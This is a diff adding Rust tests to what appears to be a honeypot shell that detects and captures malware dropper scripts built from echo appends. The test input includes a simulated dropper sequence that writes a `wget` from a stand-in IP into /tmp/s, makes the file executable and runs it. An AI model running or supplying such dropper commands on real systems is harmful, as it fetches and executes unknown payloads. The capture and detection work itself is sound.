@@ -1153,6 +1153,75 @@ mod tests {
         assert!(shell.is_assembled("/tmp/real"));
     }
 
+    /// A script dropper starts with a bare `echo > f` and grows the file by appends. The newline
+    /// is its first chunk, so the script is tracked and captured when it is made executable.
+    #[tokio::test]
+    async fn a_script_started_with_a_bare_echo_and_grown_by_appends_is_captured() {
+        let dir = tempfile::tempdir().unwrap();
+        let handoff = handoff(dir.path());
+        let captures = StdinCaptures::new(handoff.clone(), source());
+        let mut shell = loader_shell(&captures);
+        shell.handle_input("echo > /tmp/s");
+        assert!(
+            !shell.is_assembled("/tmp/s"),
+            "the probe alone is no assembly"
+        );
+        shell.handle_input("echo 'cd /tmp' >> /tmp/s");
+        shell.handle_input("echo 'wget http://203.0.113.9/x' >> /tmp/s");
+        shell.handle_input("chmod +x /tmp/s");
+        shell.handle_input("/tmp/s");
+        drop(shell);
+        drop(captures);
+        handoff.drain(std::time::Duration::from_secs(5)).await;
+        let events = events(dir.path());
+        assert_eq!(events.len(), 1, "{events:?}");
+        let meta = &events[0]["metadata"];
+        assert_eq!(meta["capture_reason"], "echo_loader");
+        assert_eq!(meta["chunk_count"], 3);
+        assert_eq!(meta["destination"], "/tmp/s");
+        assert_eq!(meta["end_reason"], "transfer_complete");
+    }
+
+    /// A truncating `echo > f` over a tracked file drops the stale record, so it does not hold a
+    /// slot that eviction cannot free.
+    #[tokio::test]
+    async fn a_bare_echo_over_a_tracked_file_drops_its_record() {
+        let dir = tempfile::tempdir().unwrap();
+        let captures = StdinCaptures::new(handoff(dir.path()), source());
+        let mut shell = loader_shell(&captures);
+        let chunks = upload_chunks(&mut shell, "/tmp/.d", &DOWNLOADER[..24]);
+        assert_eq!(chunks, 3);
+        assert!(shell.is_assembled("/tmp/.d"));
+        shell.handle_input("echo > /tmp/.d");
+        assert!(!shell.is_assembled("/tmp/.d"));
+    }
+
+    /// Probes the shell has evicted from its own table stay in the session's list; the list makes
+    /// room for a later file from them too, so an assembly typed after a sweep and never run is
+    /// still taken when the session ends.
+    #[tokio::test]
+    async fn an_unrun_assembly_after_a_probe_sweep_is_captured_at_the_session_end() {
+        let dir = tempfile::tempdir().unwrap();
+        let handoff = handoff(dir.path());
+        let captures = StdinCaptures::new(handoff.clone(), source());
+        let mut shell = loader_shell(&captures);
+        for index in 0..24 {
+            shell.handle_input(format!("echo 1 > /tmp/q{index}"));
+        }
+        let chunks = upload_chunks(&mut shell, "/tmp/keep", &DOWNLOADER[..24]);
+        assert_eq!(chunks, 3);
+        captures.end_session(CaptureEnd::PeerClosed);
+        drop(shell);
+        drop(captures);
+        handoff.drain(std::time::Duration::from_secs(5)).await;
+        let events = events(dir.path());
+        assert_eq!(events.len(), 1, "{events:?}");
+        let meta = &events[0]["metadata"];
+        assert_eq!(meta["destination"], "/tmp/keep");
+        assert_eq!(meta["chunk_count"], 3);
+        assert_eq!(meta["end_reason"], "peer_closed");
+    }
+
     /// Once the table is full of files that can never be submitted, a new assembly takes the
     /// oldest such slot, and a file that could be submitted is never the one evicted.
     #[tokio::test]
